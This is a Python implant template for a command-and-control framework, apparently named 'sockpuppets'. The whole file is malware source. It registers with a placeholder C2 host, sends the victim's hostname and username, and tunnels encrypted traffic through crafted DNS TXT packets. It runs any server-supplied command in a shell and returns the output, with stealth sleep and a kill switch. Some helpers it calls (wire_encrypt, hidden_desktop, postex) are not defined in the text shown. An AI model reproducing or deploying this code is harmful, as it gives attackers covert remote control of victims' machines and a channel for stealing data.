#!/usr/bin/env python3
import json, platform, subprocess, os, getpass, socket, base64, sys, time, random, struct, hashlib

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}
ENCRYPTION_KEY = b"{{ENCRYPTION_KEY}}"

def sleep_mask(seconds):
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    src = b'sockpuppets-sleep-mask'
    try:
        key = os.urandom(32)
        nonce = os.urandom(12)
        ct = AESGCM(key).encrypt(nonce, src, b'sockpuppets-sleep-mask-v1')
    except Exception:
        time.sleep(seconds)
        return
    time.sleep(seconds)
    try:
        AESGCM(key).decrypt(nonce, ct, b'sockpuppets-sleep-mask-v1')
    except Exception:
        pass

def stealth_sleep(seconds):
    secret = bytearray(ENCRYPTION_KEY)
    try:
        globals()['sleep_encrypt'](seconds, secret)
        return
    except Exception:
        sleep_mask(seconds)

def _key():
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes
    return HKDF(algorithm=hashes.SHA256(), length=32, salt=b'sockpuppets-salt-v1', info=b'sockpuppets-aes-256-gcm-v1').derive(ENCRYPTION_KEY)

def simple_encrypt(data: str) -> str:
    return wire_encrypt(data)

def simple_decrypt(data: str) -> str:
    return wire_decrypt(data)

def _name(labels):
    out = b''
    for label in labels:
        raw = label.encode()
        out += bytes([len(raw)]) + raw
    return out + b'\x00'

def _txt(blob):
    out = b''
    for i in range(0, len(blob), 255):
        chunk = blob[i:i+255]
        out += bytes([len(chunk)]) + chunk
    return out or b'\x00'

def _untxt(rdata):
    out = b''; i = 0
    while i < len(rdata):
        n = rdata[i]; i += 1
        out += rdata[i:i+n]; i += n
    return out

def _parse_name(data, offset):
    jumped = False
    start = offset
    while offset < len(data):
        length = data[offset]
        if length == 0:
            return start if jumped else offset + 1
        if length & 0xC0 == 0xC0:
            if not jumped:
                start = offset + 2
            offset = struct.unpack('!H', data[offset:offset+2])[0] & 0x3FFF
            jumped = True
            continue
        offset += 1 + length
    return offset

def exchange(payload: str) -> str:
    body = payload.encode()
    header = struct.pack('!HHHHHH', 1, 0x0100, 1, 0, 0, 1)
    question = _name(['c2']) + struct.pack('!HH', 16, 1)
    txt = _txt(body)
    additional = _name(['p']) + struct.pack('!HHIH', 16, 1, 0, len(txt)) + txt
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(8)
    sock.sendto(header + question + additional, (SERVER_HOST, SERVER_PORT))
    data, _ = sock.recvfrom(65535)
    sock.close()
    qd, an = struct.unpack('!HH', data[4:8])
    offset = 12
    for _ in range(qd):
        offset = _parse_name(data, offset) + 4
    for _ in range(an):
        offset = _parse_name(data, offset)
        rtype, _, _, rdlen = struct.unpack('!HHIH', data[offset:offset+10])
        rdata = data[offset+10:offset+10+rdlen]
        if rtype == 16:
            return _untxt(rdata).decode()
    return ''

def execute_command(command: str) -> str:
    if str(command).startswith('__hd:'):
        return hidden_desktop(command)
    if str(command).startswith('__px:'):
        return postex(command)
    if command == '__kill':
        sys.exit(0)
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return (result.stdout + result.stderr) or 'Command executed successfully (no output)'
    except Exception as e:
        return f'Error: {e}'

def connect_to_server():
    agent_id = None
    pending = []
    while True:
        try:
            if not agent_id:
                meta = {'hostname': socket.gethostname(), 'username': getpass.getuser(), 'os': platform.system(), 'mode': 'beacon', 'beacon_interval': BEACON_INTERVAL}
                reply = json.loads(simple_decrypt(exchange(simple_encrypt(json.dumps({'type': 'register', 'metadata': meta})))))
                agent_id = reply.get('agent_id') or None
                if not agent_id:
                    stealth_sleep(5)
                    continue
            msg = {'type': 'checkin', 'agent_id': agent_id, 'metadata': {'mode': 'beacon', 'beacon_interval': BEACON_INTERVAL, 'hostname': socket.gethostname()}, 'results': pending}
            pending = []
            data = json.loads(simple_decrypt(exchange(simple_encrypt(json.dumps(msg)))))
            if data.get('type') == 'registered':
                agent_id = data.get('agent_id')
                continue
            for cmd in data.get('commands') or []:
                command = cmd.get('command', '')
                if command == '__kill':
                    sys.exit(0)
                if command:
                    pending.append({'type': 'response', 'command': command, 'output': execute_command(command), 'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')})
            stealth_sleep(BEACON_INTERVAL)
        except Exception:
            stealth_sleep(5)

if __name__ == '__main__':
    connect_to_server()
